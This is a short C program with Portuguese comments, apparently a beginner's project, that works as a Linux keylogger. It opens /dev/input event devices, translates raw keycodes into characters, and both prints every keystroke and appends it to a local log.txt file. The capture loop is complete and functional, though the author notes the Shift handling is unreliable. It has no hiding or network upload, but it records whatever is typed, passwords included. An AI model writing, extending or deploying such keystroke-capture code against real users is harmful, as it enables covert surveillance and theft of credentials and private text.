#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>

// vou fazer um array com as teclas basicas
// vi isso num forum que é mais facil que if

const char teclas[128] = {
    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', 0,
    0, 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', 0,
    0, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 0,
    '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, '*', 0, ' '
};

// tentei fazer shift mas nao consegui fazer direito
// vou deixar pra depois

FILE *logfile;

int main() {
    int teclado;
    
    // tenta achar o teclado 
    teclado = open("/dev/input/event1", O_RDONLY);
    if(teclado == -1) {
        teclado = open("/dev/input/event2", O_RDONLY);
    }
    if(teclado == -1) {
        teclado = open("/dev/input/event0", O_RDONLY);
    }
    if(teclado == -1) {
        printf("abre o teclado nao, tenta com sudo\n");
        return 1;
    }
    
    printf("teclado aberto! (aperta ctrl+c pra parar)\n");
    
    logfile = fopen("log.txt", "a");
    if(!logfile) {
        printf("erro no arquivo\n");
        return 1;
    }
    
    struct input_event ev;
    int shift_pressed = 0; // tentei fazer shift mas nao ta funcionando bem
    
    while(1) {
        read(teclado, &ev, sizeof(ev));
        
        if(ev.type == 1 && ev.value == 1) { // tecla apertada
            
            // ve se é shift
            if(ev.code == 42 || ev.code == 54) {
                shift_pressed = 1;
                continue;
            }
            
            // trata as teclas normais
            if(ev.code >= 0 && ev.code < 128 && teclas[ev.code] != 0) {
                char c = teclas[ev.code];
                
                // tenta fazer maiusculo (orovavel ta errado)
                if(shift_pressed) {
                    if(c >= 'a' && c <= 'z') {
                        c = c - 32; // vira maiusculo
                    }
                }
                
                printf("%c", c);
                fprintf(logfile, "%c", c);
            }
            else {
                // teclas especiais
                switch(ev.code) {
                    case 14:
                        printf("<BS>");
                        fprintf(logfile, "<BS>");
                        break;
                    case 28:
                        printf("\n");
                        fprintf(logfile, "\n");
                        break;
                    case 57:
                        printf(" ");
                        fprintf(logfile, " ");
                        break;
                    case 15:
                        printf("<TAB>");
                        fprintf(logfile, "<TAB>");
                        break;
                    default:
                        printf("[%d]", ev.code);
                        fprintf(logfile, "[%d]", ev.code);
                        break;
                }
            }
            
            fflush(logfile);
        }
        
        // quando solta o shift
        if((ev.code == 42 || ev.code == 54) && ev.value == 0) {
            shift_pressed = 0;
        }
    }
    
    fclose(logfile);
    close(teclado);
    return 0;
}